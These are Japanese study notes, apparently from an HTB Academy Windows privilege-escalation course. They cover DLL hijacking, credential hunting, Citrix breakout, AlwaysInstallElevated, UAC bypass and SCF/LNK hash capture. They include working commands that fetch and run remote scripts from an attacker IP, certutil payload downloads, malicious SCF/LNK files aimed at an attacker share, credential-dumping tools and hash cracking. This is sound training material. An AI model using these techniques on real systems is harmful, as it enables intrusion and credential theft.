	- **その他の脆弱性（CVE-2020-0668など）**：サービスの追跡機能など、様々なWindowsの機能に潜む脆弱性が権限昇格に使われることがある。ファイル操作権限の欠陥と組み合わせて、SYSTEM権限で動くプログラムを置き換えたりすることが可能だった。（多くはパッチ済み）
- まとめ
	- カーネルエクスプロイトは最も危険な権限昇格手法の一つ
	- **OSやインストールされているソフトウェアに最新のセキュリティパッチを適用することが最も重要**
	- サポートが終了した古いOSは、既知の脆弱性に対するパッチが提供されないため、特に危険。ネットワークから隔離したり、新しいOSに移行したりする必要がある。
	- 攻撃者は「パッチが当たっていない古いシステム」を狙うことが多い

### 列挙
WindowsのOS Versionを確認する
- これができなくても、enum4-linuxで取得可能
```sh
systeminfo
```

インストールされているセキュリティパッチの列挙
```sh
Get-CimInstance -Class win32_quickfixengineering | Where-Object { $_.Description -eq "Security Update" }
```

## 脆弱なサービス
### インストールされているプログラムの列挙
- まずはインストールされているアプリケーションを列挙して、システムの状況を把握することから始める
```cmd-session
C:\htb> wmic product get name

Name
Microsoft Visual C++ 2019 X64 Minimum Runtime - 14.28.29910
Update for Windows 10 for x64-based Systems (KB4023057)
Microsoft Visual C++ 2019 X86 Additional Runtime - 14.24.28127
VMware Tools
Druva inSync 6.6.3　<-- これが気になる
Microsoft Update Health Tools
Microsoft Visual C++ 2019 X64 Additional Runtime - 14.28.29910
Update for Windows 10 for x64-based Systems (KB4480730)
Microsoft Visual C++ 2019 X86 Minimum Runtime - 14.24.28127
```

### ローカルポートの列挙
```cmd-session
C:\htb> netstat -ano

  TCP    127.0.0.1:6064         0.0.0.0:0              LISTENING       3324
  TCP    127.0.0.1:6064         127.0.0.1:50274        ESTABLISHED     3324
  TCP    127.0.0.1:6064         127.0.0.1:50510        TIME_WAIT       0
  TCP    127.0.0.1:6064         127.0.0.1:50511        TIME_WAIT       0
  TCP    127.0.0.1:50274        127.0.0.1:6064         ESTABLISHED     3860
```

### プロセスIDの列挙
次に、プロセスID (PID) 3324を実行中のプロセスにマッピングする
```powershell-session
PS C:\htb> get-process -Id 3324

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
    149      10     1512       6748              3324   0 inSyncCPHwnet64
```

### 実行中サービスの列挙
```powershell-session
PS C:\htb> get-service | ? {$_.DisplayName -like 'Druva*'}

Status   Name               DisplayName
------   ----               -----------
Running  inSyncCPHService   Druva inSync Client Service
```

## DLLインジェクション
DLLインジェクションについて
- DLLインジェクションは、実行中の他のプログラムに、自分の作ったコード（DLLという部品プログラムの形）を無理やり読み込ませて動かす技術
	- **良い使い方**: プログラムを止めずに一部の機能だけアップデートするなど
	- **悪い使い方**: ウイルスなどのマルウェアを、セキュリティソフトに検知されにくい「信用されているプログラムの中」で動かすため
- 悪用される主な方法がいくつかある
	- **LoadLibraryを使う方法**: プログラムがDLLを読み込む機能（LoadLibrary）を、攻撃者がターゲットのプログラムに対して外部から使わせる方法。自分の悪意のあるDLLを、ターゲットのプログラムに読み込ませる。
	- **DLLハイジャック**: プログラムが特定のDLLファイルを読み込む際に、Windowsが決まったフォルダの順序でファイルを探しに行く仕組みを悪用する。
		- プログラムが探しているDLLファイルの名前と同じ、悪意のあるDLLファイルを作成する
		- Windowsが正規のDLLを見つけるよりも前に探してしまうフォルダ（ユーザーが自由にファイルを置ける場所など）に、その悪意のあるDLLを置く
		- プログラムが間違って攻撃者のDLLを読み込んでしまい、その中の悪意のあるコードが実行されてしまう
		- アプリケーションがDLLのフルパスを指定していない場合に発生しやすい
- DLLハイジャックの具体的な例
	- プログラムが使うべきDLLファイルの名前を、攻撃者が作ったDLLに付け替えて、プログラムが読み込む場所に置く（例：library.dll -> library.o.dll にリネームし、攻撃者のDLLを library.dll として置く）
	- プログラムが「探しているけど見つからない」DLLの名前（例：x.dll）で、攻撃者が作ったDLLを置いておく
- 危険性
	- 悪意のあるコードが、ターゲットのプログラム（例えば管理者権限で動いているもの）と同じ権限で実行されてしまう可能性がある
	- セキュリティソフトが、信用されているプログラムが動いていると判断して、中の悪意のあるコードを見逃してしまうことがある
- まとめ
	- DLLインジェクションは、マルウェアなどがシステムの防御を回避するためによく使う技術
	- アプリケーションがDLLを読み込む際の仕組みの弱点を突くことが多い
	- **対策としては、アプリケーションのセキュリティパッチを常に適用することが重要（特に古いアプリケーションに注意）**
	- 不明な提供元のソフトウェアをインストールしない、むやみにファイルを置かないといった基本的な対策も有効

# Credential Hunting
## ファイルの検索

**一般的なファイル拡張子での検索**

C:以下のディレクトリでpasswordと言う文字列をファイル内に入ってるファイルを探す
- ファイル名だけ出力する
```powershell-session
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml
```

ファイル名、行番号、マッチした行の内容が出力される
```powershell-session
select-string -Path C:\Users\htb-student\Documents\*.txt -Pattern password
```

指定されたパターンに一致するファイル名が出力される
```cmd-session
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
```

指定されたパターンに一致するファイル名が出力される
```cmd-session
C:\htb> where /R C:\ *.config
```

指定された拡張子のファイルが再帰的に検索され、詳細情報と共に出力される
```powershell-session
PS C:\htb> Get-ChildItem C:\ -Recurse -Include *.rdp, *.config, *.vnc, *.cred -ErrorAction Ignore
```

cdで指定したドキュメントの中で検索する
- ファイル名だけが出力されるモード
```cmd-session
C:\htb> cd c:\Users\htb-student\Documents & findstr /SI /M "password" *.xml *.ini *.txt
```

ファイル名、行番号、マッチした行の内容が出力される
```cmd-session
C:\htb> findstr /si password *.xml *.ini *.txt *.config
```

訳注：ファイル名、行番号、マッチした行の内容が出力される。/nオプションで行番号も表示
```cmd-session
C:\htb> findstr /spin "password" *.*
```

**Sticky Notesのパスワード**
- 人々はしばしば、Windowsワークステーション上のStickyNotesアプリを使ってパスワードやその他の情報を保存しますが、それがデータベースファイルであることを認識していない
- `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite`にあり、常に検索して調査する価値がある

**StickyNotes DBファイルの検索**
- これら3つの`plum.sqlite*ファイル`を自分のシステムにコピーし、DB Browser for SQLiteのようなツールで開いて、`select Text from Note;`というクエリを使ってNoteテーブルのText列を表示させることができる
```powershell-session
 ls C:\Users\htb-student\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState
 
 
Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         5/25/2021  11:59 AM          20480 15cbbc93e90a4d56bf8d9a29305b8981.storage.session
-a----         5/25/2021  11:59 AM            982 Ecs.dat
-a----         5/25/2021  11:59 AM           4096 plum.sqlite
-a----         5/25/2021  11:59 AM          32768 plum.sqlite-shm
-a----         5/25/2021  12:00 PM         197792 plum.sqlite-wal
```

**PowerShellを使ったSticky Notesデータの表示**
- まずモジュールをインポートし、データソース（この場合はSticky Notesアプリが使用するSQLiteデータベースファイル）を指定し、最後にNoteテーブルをクエリして興味深いデータを検索する
- `.sqlite`ファイルをダウンロードした後、またはWinRM経由でリモートから攻撃マシン上で実行することも可能
```powershell-session
PS C:\htb> Set-ExecutionPolicy Bypass -Scope Process

Execution Policy Change
The execution policy helps protect you from scripts that you do not trust. Changing the execution policy might expose
you to the security risks described in the about_Execution_Policies help topic at
https:/go.microsoft.com/fwlink/?LinkID=135170. Do you want to change the execution policy?
[Y] Yes  [A] Yes to All  [N] No  [L] No to All  [S] Suspend  [?] Help (default is "N"): A

PS C:\htb> cd .\PSSQLite\
PS C:\htb> Import-Module .\PSSQLite.psd1
PS C:\htb> $db = 'C:\Users\htb-student\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite'
PS C:\htb> Invoke-SqliteQuery -Database $db -Query "SELECT Text FROM Note" | ft -wrap
 
Text
----
\id=de368df0-6939-4579-8d38-0fda521c9bc4 vCenter
\id=e4adae4c-a40b-48b4-93a5-900247852f96
\id=1a44a631-6fff-4961-a4df-27898e9e1e65 root:Vc3nt3R_adm1n!
\id=c450fc5f-dc51-4412-b4ac-321fd41c522a Thycotic demo tomorrow at 10am
```

**stringsコマンドを使ったDBファイル内容の表示**
- これらのファイルを攻撃マシンにコピーし、stringsコマンドを使ってデータを検索することもできる
- ただし、データベースのサイズによっては効率が悪い場合がある
```shell-session
snowyowl644@htb[/htb]$  strings plum.sqlite-wal
```

**その他の興味深いファイル**
- 資格情報が見つかる可能性のあるその他のファイルには、以下のようなものがある
	- このモジュールの前半で挙げた権限昇格列挙スクリプトのいくつかは、このセクションで言及されているほとんど、または全てのファイルや拡張子を検索する
```shell-session
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
%WINDIR%\System32\drivers\etc\hosts
C:\ProgramData\Configs\*
C:\Program Files\Windows PowerShell\*
```
ntuser.datはあんまりアツくない
- Windowsのネットワークプロファイル設定を保存
- Wi-Fiネットワーク名、接続履歴、ネットワークカテゴリ（Public/Private）など
- パスワードは含まれない



辞書ファイル
- 例えば、パスワードのような機密情報が、認識できない単語に下線を引くメールクライアントやブラウザベースのアプリケーションで入力されることがあります。ユーザーは煩わしい赤い下線を避けるために、これらの単語を辞書に追加する可能性がある
```powershell-session
PS C:\htb> gc 'C:\Users\htb-student\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt' | Select-String password
```

無人インストールファイルは、自動ログオン設定やインストールの一部として作成される追加アカウントを定義することがある
- インストールの一部として自動的に削除されるべきですが、システム管理者がイメージと応答ファイルの開発中に、他のフォルダにファイルのコピーを作成している場合がある
```xml
<?xml version="1.0" encoding="utf-8"?>
<unattend xmlns="urn:schemas-microsoft-com:unattend">
    <settings pass="specialize">
        <component name="Microsoft-Windows-Shell-Setup" processorArchitecture="amd64" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" xmlns:wcm="http://schemas.microsoft.com/WMIConfig/2002/State" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
            <AutoLogon>
                <Password>
                    <Value>local_4dmin_p@ss</Value>
                    <PlainText>true</PlainText>
                </Password>
                <Enabled>true</Enabled>
                <LogonCount>2</LogonCount>
                <Username>Administrator</Username>
            </AutoLogon>
            <ComputerName>*</ComputerName>
        </component>
    </settings>
```

PowerShell履歴ファイル
- Windows 10のPowerShell 5.0以降、PowerShellはコマンド履歴を以下のファイルに保存する
`C:\Users\<username>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`

PowerShell履歴保存パスの確認
```powershell-session
PS C:\htb> (Get-PSReadLineOption).HistorySavePath

C:\Users\htb-student\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

PowerShell履歴ファイルの読み取り
- 上でファイルの場所が分かれば（デフォルトパスは上記）、gc を使用してその内容を読み取ることができる
```powershell-session
PS C:\htb> gc (Get-PSReadLineOption).HistorySavePath
```

現在のユーザーとしてアクセスできるすべてのPowerShell履歴ファイルの内容を取得することもできる
```powershell-session
PS C:\htb> foreach($user in ((ls C:\users).fullname)){cat "$user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ErrorAction SilentlyContinue}
```

xcd## PowerShell認証情報
- PowerShell認証情報は、暗号化された認証情報を便利に保存する方法として、スクリプトや自動化タスクでしばしば使用される
- 認証情報はDPAPIで保護されており、通常は作成されたのと同じコンピューター上の同じユーザーによってのみ復号化できる

システム管理者がvCenterサーバーに簡単に接続するために作成した以下のスクリプト Connect-VC.ps1があるとする
```powershell
# Connect-VC.ps1
# Get-Credential | Export-Clixml -Path 'C:\scripts\pass.xml'
$encryptedPassword = Import-Clixml -Path 'C:\scripts\pass.xml'
$decryptedPassword = $encryptedPassword.GetNetworkCredential().Password
Connect-VIServer -Server 'VC-01' -User 'bob_adm' -Password $decryptedPassword
```

PowerShell認証情報の復号化
- このユーザーのコンテキストでコマンド実行権限を得た場合、またはDPAPIを悪用できる場合、encrypted.xml から平文の認証情報を回復できることもある
```powershell-session
PS C:\htb> $credential = Import-Clixml -Path 'C:\scripts\pass.xml'
PS C:\htb> $credential.GetNetworkCredential().username
bob
PS C:\htb> $credential.GetNetworkCredential().password

Str0ng3ncryptedP@ss!
```
## その他
### Cmdkeyに保存された資格情報
- cmdkeyコマンドは、保存されたユーザー名とパスワードを作成、リスト表示、削除するために使用できる
- ユーザーは特定のホストの資格情報を保存したい場合や、Remote Desktopを使用してリモートホストに接続する際にパスワードを入力する手間を省くためにターミナルサービス接続の資格情報を保存するためにこれを使用することがある
- 異なるユーザーで別のシステムに横移動したり、現在のホスト上で他のユーザーのために保存された資格情報を利用して権限を昇格させたりするのに役立つ
```cmd-session
C:\htb> cmdkey /list

    Target: LegacyGeneric:target=TERMSRV/SQL01
    Type: Generic
    User: inlanefreight\bob
```

また、runasを使って資格情報を再利用し、そのユーザーとしてリバースシェルを起動したり、バイナリを実行したり、または以下のようなコマンドでPowerShellまたはCMDコンソールを起動したりすることも可能
```powershell-session
PS C:\htb> runas /savecred /user:inlanefreight\bob "COMMAND HERE"
```

### ブラウザの資格情報
**Chromeから保存された資格情報の取得**  
- ユーザーは頻繁にアクセスするアプリケーションのために、ブラウザに資格情報を保存していることがよくある
- SharpChromeのようなツールを使って、Google Chromeからクッキーや保存されたログイン情報を取得することができる
```powershell-session
PS C:\htb> .\SharpChrome.exe logins /unprotect

[*] AES state key file : C:\Users\bob\AppData\Local\Google\Chrome\User Data\Local State
[*] AES state key      : 5A2BF178278C85E70F63C4CC6593C24D61C9E2D38683146F6201B32D5B767CA0
```

### パスワードマネージャー
KeePassのようなツールのファイル（`.kdbx`）。ファイル自体をクラッキングツールにかけるとパスワードがわかることがある。
```shell-session
snowyowl644@htb[/htb]$ python2.7 keepass2john.py ILFREIGHT_Help_Desk.kdbx 

ILFREIGHT_Help_Desk:$keepass$*2*60000*222*f49632ef7dae20e5a670bdec2365d5820ca1718877889f44e2c4c202c62f5fd5*2e8b53e1b11a2af306eb8ac424110c63029e03745d3465cf2e03086bc6f483d0*7df525a2b843990840b249324d55b6ce*75e830162befb17324d6be83853dbeb309ee38475e9fb42c1f809176e9bdf8b8*63fdb1c4fb1dac9cb404bd15b0259c19ec71a8b32f91b2aaaaf032740a39c154
```

### ハッシュのオフラインクラッキング
```shell-session
snowyowl644@htb[/htb]$ hashcat -m 13400 keepass_hash /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt
```

### メール
- Microsoft Exchangeの受信トレイを持つドメインユーザーのコンテキストでドメイン参加システムにアクセスできた場合、MailSniperツールを使用して、ユーザーのメールから「pass」「creds」「credentials」などの用語を検索してみることができる
	- https://github.com/dafthack/MailSniper

### LaZagne
- 他の全てが失敗した場合、LaZagneツールを実行して、さまざまなソフトウェアから資格情報を取得してみることができる
全てのLaZagneモジュールの実行
```powershell-session
PS C:\htb> .\lazagne.exe all
```

### SessionGopher
- SessionGopherを使用して、保存されたPuTTY、WinSCP、FileZilla、SuperPuTTY、およびRDPの資格情報を抽出できる
- ドメイン参加（またはスタンドアロン）ホストにログインしたことのある全てのユーザーのHKEY_USERSハイブを検索し、見つかる全ての保存されたセッション情報を検索して復号します。また、PuTTY秘密鍵ファイル（.ppk）、Remote Desktop（.rdp）、およびRSA（.sdtid）ファイルを探すためにドライブを検索して実行することもできる

[SessionGopher.ps1](https://github.com/Arvanaghi/SessionGopher/blob/master/SessionGopher.ps1)
```powershell-session
Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
PS C:\htb> Import-Module .\SessionGopher.ps1
 
PS C:\Tools> Invoke-SessionGopher -Target WINLPE-SRV01
```

**レジストリへの平文パスワード保存**
特定のプログラムやWindowsの設定により、平文のパスワードやその他のデータがレジストリに保存されることがある

Windows AutoLogon
- Windows Autologonは、ユーザーがWindowsオペレーティングシステムを起動するたびに手動でユーザー名とパスワードを入力する必要なく、特定のユーザーアカウントに自動的にログオンするように構成できる機能
- 一度これが構成されると、ユーザー名とパスワードはレジストリに平文で保存されます。この機能は、シングルユーザーシステムや、セキュリティよりも利便性が優先される状況で一般的に使用される
```cmd-session
C:\htb>reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
    AutoRestartShell    REG_DWORD    0x1
    Background    REG_SZ    0 0 0
    
    <SNIP>
    
    AutoAdminLogon    REG_SZ    1
    DefaultUserName    REG_SZ    htb-student
    DefaultPassword    REG_SZ    HTB_@cademy_stdnt!
```

Autologonアカウントの典型的な構成には、以下のレジストリキーの手動設定が含まれる
- AdminAutoLogon - Autologonが有効か無効かを決定します。「1」の値は有効であることを意味します。
- DefaultUserName - 自動的にログオンするアカウントのユーザー名の値を保持します。
- DefaultPassword - 以前に指定されたユーザーアカウントのパスワードの値を保持します。

### Putty
プロキシ接続を利用するPuttyセッションの場合、セッションが保存されると、資格情報がレジストリに平文で保存されます。
```cmd
Computer\HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\<SESSION NAME>
```

**セッションの列挙と資格情報の発見**
```powershell-session
PS C:\htb> reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions

HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\kali%20ssh
```

### Wifiパスワード
**保存されたワイヤレスネットワークの表示**  
ワイヤレスカード搭載のユーザーワークステーションにローカル管理者アクセス権を取得した場合、最近接続したワイヤレスネットワークをリスト表示できる
```cmd-session
C:\htb> netsh wlan show profile ilfreight_corp key=clear
```

# Citrix Breakout

## 目的
- 制限されたデスクトップ環境（Citrixなど）から抜け出し、自由にコマンドを実行したり、権限を上げたりすること。
- ファイルエクスプローラーなどでアクセスが制限されている場所（C:\Windows\System32など）にアクセスできるようになること。

## 基本的な考え方
1. 制限されていない「ダイアログボックス」（ファイルを開く/保存など）を見つける。
2. そのダイアログボックス経由で、制限をバイパスしてコマンド実行の足がかりを作る。
3. コマンドが打てるようになったら、権限昇格の手法を探して実行する。

## 具体的な手法とコマンド/ツール

### 1. ファイルパス制限の回避
 - `C:\Users`などが直接見れない場合
	 - グループポリシーによって制限されている
回避策
- **ダイアログボックスを使う:** PaintやNotepadなどの「ファイルを開く/保存」ダイアログを開く。
- **UNCパスを使う:** ダイアログボックスのファイル名入力欄に `\\127.0.0.1\c$\Users\対象ユーザー名` のように入力すると、ローカルのドライブにアクセスできることがある。
  - `\\127.0.0.1\c$\...` -> ローカルのCドライブ
  - `\\攻撃マシンIP\共有名\...` -> 外部のSMB共有にアクセス
- ![](https://i.imgur.com/W30mL69.png)

### 2. ファイル転送とコマンド実行の足がかり
- 制限が設定されている場合、ファイルエクスプローラーは、攻撃者マシンまたは Citrix 環境をホストしている Ubuntu サーバー上の SMB 共有への直接アクセスを許可しない
回避策
- **外部のSMB共有を使う**
1.  攻撃マシン (Linuxなど) でSMBサーバーを立てる 
```
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support share $(pwd)
```
こっちでも
```sh
smbserver.py -smb2support share $(pwd)
```
2. Citrix環境でダイアログボックスを開き、ファイル名に `\\攻撃マシンIP\share` と入力して共有にアクセス。
	1. スタートメニューから「Paint」アプリケーションを起動して、「ファイル」メニューに進み、「開く」を選択してダイアログボックスを表示させる
	2. ファイルタイプのパラメータが「すべてのファイル」に設定されていることを確認する
	3. Enter キーを押すと、共有へのアクセスが達成される
![](https://i.imgur.com/8frc7Ef.png)

3.  **共有上の実行可能ファイルを実行**
  - SMB共有上の `pwn.exe` (cmd.exeを起動するカスタムexe) を右クリックして「開く」で実行し、コマンドプロンプトを起動する。
  - スクリプトファイル (`.bat`, `.ps1`) を実行する（実行ポリシーなどに注意）。例: `evil.bat` の中身を `cmd` にする。

pwn.exe
```c
#include <stdlib.h>
int main() {
  system("C:\\Windows\\System32\\cmd.exe");
}
```
- **代替エクスプローラーを使う**
  - Explorer++ などをSMB共有からコピーし、実行する。これを使うと、制限を無視してファイルをコピーしたり移動したりできる。
	  - https://explorerplusplus.com/
- **代替レジストリエディター**
	- 同様に、デフォルトのレジストリエディターがグループポリシーによってブロックされている場合、標準のグループポリシー制限をバイパスするために代替レジストリエディターを使用できる
	- [Simpleregedit](https://sourceforge.net/projects/simpregedit/)、[Uberregedit](https://sourceforge.net/projects/uberregedit/)、[SmallRegistryEditor](https://sourceforge.net/projects/sre/) は、グループポリシーによるブロックの影響を受けずに Windows レジストリの編集を容易にする GUI ツールの例

**既存のショートカットファイルを変更する**
- フォルダパスへの不正アクセスは、既存の Windows ショートカットを変更し、ターゲットフィールドに目的の実行ファイルのパスを設定することによっても達成できる
1. 目的のショートカットを右クリックする
![](https://i.imgur.com/SARAr2Q.png)

2. 「プロパティ」を選択する
![](https://i.imgur.com/5TBFTWG.png)

3. ターゲットフィールド内で、アクセスしたい意図したフォルダのパスに変更します。
4. ショートカットを実行すると、cmd が起動します。
![](https://i.imgur.com/NAUlUDi.png)

**スクリプト実行**
- メモ帳とかでshell.txtみたいな感じで書いて、拡張子を.batとかにすればできる時もある

### 3. 権限昇格 (管理者権限などを得る)
- **AlwaysInstallElevated 脆弱性を探す:**
  - レジストリで設定を確認するコマンド
```cmd-session
C:\> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer
		AlwaysInstallElevated    REG_DWORD    0x1

C:\> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer
		AlwaysInstallElevated    REG_DWORD    0x1
```
  - どちらかが `0x1` になっていたら脆弱性あり。
  - PowerUp.ps1 などで自動検出も可能。
- **ツールの悪用:**
	- [WinPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS)とか、[PowerUp](https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1)とか
  - PowerUp.ps1 を使う（SMB共有などからコピーしてくる）。
  - PowerUp.ps1 の `Write-UserAddMSI` 関数を使って管理者権限で実行される `.msi` ファイルを作成する。
```powershell-session
PS C:\Users\pmorgan\Desktop> Set-ExecutionPolicy Bypass -Scope Process
PS C:\Users\pmorgan\Desktop> Import-Module .\PowerUp.ps1
PS C:\Users\pmorgan\Desktop> Write-UserAddMSI
	
Output Path
-----------
UserAdd.msi
```
  - 作成された `UserAdd.msi` を実行し、管理者グループに新しいユーザーを追加する。
![](https://i.imgur.com/OCZ18TO.png)


### 4. UACバイパス (管理者権限があっても Administrator フォルダなどに入れない場合)
- 新しく確立されたユーザー backdoor は Administrators グループのメンバーですが、User Account Control (UAC) の存在により、C:\users\Administrator ディレクトリへのアクセスは依然として不可能なことがある
- **UACバイパススクリプト/ツールを使う:**
  - [Bypass-UAC.ps1](https://github.com/FuzzySecurity/PowerShell-Suite/tree/master/Bypass-UAC) などのスクリプトをSMB共有などからコピーしてくる。
```cmd
copy \\10.13.38.95\share\Bypass-UAC.ps1 C:\Users\pmorgan\Desktop\Bypass-UAC.ps1
```
  - PowerShellでスクリプトをインポートし、バイパス関数を実行する。
```powershell-session
PS C:\Users\Public> Import-Module .\Bypass-UAC.ps1
PS C:\Users\Public> Bypass-UAC -Method UacMethodSysprep
```
- 成功すると、新しい高権限のコマンドプロンプトやPowerShellが開かれる。
- 権限確認コマンド:
  - `whoami /all`
  - `whoami /priv`

## 流れ
1. 制限された環境にログイン。
2. Paintなどでファイルダイアログボックスを開く。
3. 攻撃マシン上のSMB共有にUNCパス (`\\攻撃マシンIP\share`) でアクセスする。
4. 共有から以下のツール/ファイルをコピーまたは直接実行する：
    - コマンド実行用exe (`pwn.exe`など) やスクリプト (`evil.bat`) -> まずコマンドプロンプトを得る。
    - 代替エクスプローラー (`Explorer++`) -> ファイルコピーを自由にするため。
    - 権限昇格ツール (`PowerUp.ps1`, `Winpeas.exe`) -> 脆弱性を探すため。
    - UACバイパススクリプト (`Bypass-UAC.ps1`) -> UACを突破するため。
5. 取得したコマンドプロンプトで権限昇格ツールなどを実行し、`AlwaysInstallElevated` などの脆弱性を探す。
6. 見つかった脆弱性を利用して、管理者権限を持つ新しいユーザーを作成する（例: `Write-UserAddMSI`）。
7. 作成した管理者ユーザーで `runas` を使ってコマンドプロンプトを起動する。
8. もしまだ Administrator ディレクトリなどに入れない場合、UACバイパススクリプトを実行して権限を完全に昇格させる。
9. 高権限シェルでフラグや目的の情報を見つける。


# 追加のテクニック
## ユーザーとのやり取りの悪用
セキュリティ勉強中のこの分野についてはこの分野について初心者の人向けのまとめ

攻撃者がユーザーの操作を利用してシステムに侵入したり、権限を奪ったりする手法について説明されています。
- ユーザーはセキュリティの弱い点になりうる
	- 従業員が急いでいたり、注意を払っていないと、悪意のあるファイルやリンクに気づきにくい
	- Windowsには多くの攻撃できる箇所（攻撃対象領域）がある

- ネットワークトラフィックからの認証情報窃盗
	- Wiresharkなどがインストールされている場合、非特権ユーザーでもトラフィックをキャプチャできることがある
	- 暗号化されていない通信（例: FTP）で平文のパスワードが見えることがある
	- 攻撃用マシンからtcpdumpやWiresharkを使い、トラフィックを長時間監視する
	- net-credsツールで認証情報を抽出する
- プロセスのコマンドラインからの認証情報窃盗
	- スケジュールタスクなどで、パスワードがコマンドラインで渡されることがある
	- プロセスのコマンドラインを定期的に監視するスクリプトを使う
		- スクリプト内容（PowerShell）:
			```powershell
			while($true) {
			  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
			  Start-Sleep 1
			  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
			  Compare-Object -ReferenceObject $process -DifferenceObject $process2
			}
			```
	- ターゲットホストでスクリプトを実行するコマンド:
		- `IEX (iwr 'http://10.10.10.205/procmon.ps1')`
	- コマンドラインにパスワード（例: `net use T: \\sql02\backups /user:inlanefreight\sqlsvc My4dm1nP@s5w0Rd`）が見つかることがある

- ユーザー操作が必要な脆弱なサービスの悪用
	- Docker Desktopの古いバージョン（CVE-2019-15752）のように、特定のディレクトリへの書き込み権限が緩いサービスがある
	- 攻撃者は脆弱なディレクトリに悪意のある実行可能ファイルを配置する
	- ユーザーがそのサービスを開始したり、特定の操作（例: `docker login`）をしたりすると、配置したファイルが実行される可能性がある
	- 権限昇格につながる可能性があり、長期的な監視で利用できる

- ファイル共有を利用した認証情報窃盗（SCFファイル/LNKファイル）
	- SCF (Shell Command File) ファイルはWindows Explorerが使う設定ファイル
	- SCFファイルのアイコンファイルパスを、攻撃者マシンのUNCパス（`\\<attackerIP>\...`）に設定できる
	- ユーザーがそのSCFファイルがある共有フォルダを開くと、Windows Explorerがアイコンファイルを探しに行き、攻撃者マシンへのSMBセッションを開始する
	- 攻撃者側でResponderなどのツールを起動しておくと、このSMBセッションからユーザーのNTLMv2ハッシュをキャプチャできる
		- 悪意のあるSCFファイルの内容例:
```ini
[Shell]
Command=2
IconFile=\\10.10.14.3\share\legit.ico
[Taskbar]
Command=ToggleDesktop
```
- Responderの起動コマンド:
```
sudo responder -wrf -v -I tun0
```
- キャプチャしたNTLMv2ハッシュをHashcatなどのツールでオフラインでクラックし、平文パスワードを得る
	- Hashcatでのクラックコマンド例:
		- `hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt` (hashはキャプチャしたハッシュファイル)
- Server 2019以降ではSCFの代わりに.lnk (ショートカット) ファイルを使う
- .lnkファイルもアイコンファイルパスなどに攻撃者マシンへのUNCパスを設定できる
- PowerShellで悪意のある.lnkファイルを生成するスクリプト例:
	```powershell
	$objShell = New-Object -ComObject WScript.Shell
	$lnk = $objShell.CreateShortcut("C:\legit.lnk")
	$lnk.TargetPath = "\\<attackerIP>\@pwn.png"
	$lnk.WindowStyle = 1
	$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
	$lnk.Description = "Browsing to the directory where this file is saved will trigger an auth request."
	$lnk.HotKey = "Ctrl+Alt+O"
	$lnk.Save()
	```



## 侵入後の攻撃と権限昇格
- LOLBAS (環境内既存バイナリ・スクリプト利用)
	- 概要: Windowsにデフォルトで存在する信頼されたバイナリやスクリプトを悪用する手法。
	- Certutilを使ったファイル転送/エンコード/デコード
		- 用途: 証明書ツールだが、ファイルダウンロードやBase64変換に使える。
		- ファイルダウンロード: `certutil.exe -urlcache -split -f http://[攻撃者IP]:[ポート]/shell.bat shell.bat`
		- ファイルBase64エンコード: `certutil -encode file1 encodedfile`
		- ファイルBase64デコード: `certutil -decode encodedfile file2`
	- rundll32.exeを使ったDLL実行 (リバースシェルなど)
		- 用途: DLLファイルを実行できる。悪意のあるDLLを実行してシェルを得るなど。
- Always Install Elevated (常に昇格した権限でインストール) 設定の悪用
	- 概要: この設定が有効な場合、低権限ユーザーでもMSIパッケージをSYSTEM権限で実行できる脆弱性。
	- 設定の確認（レジストリの値 `AlwaysInstallElevated` が `0x1` かどうか）
		- ユーザー設定: `reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer`
		- コンピュータ設定: `reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer`
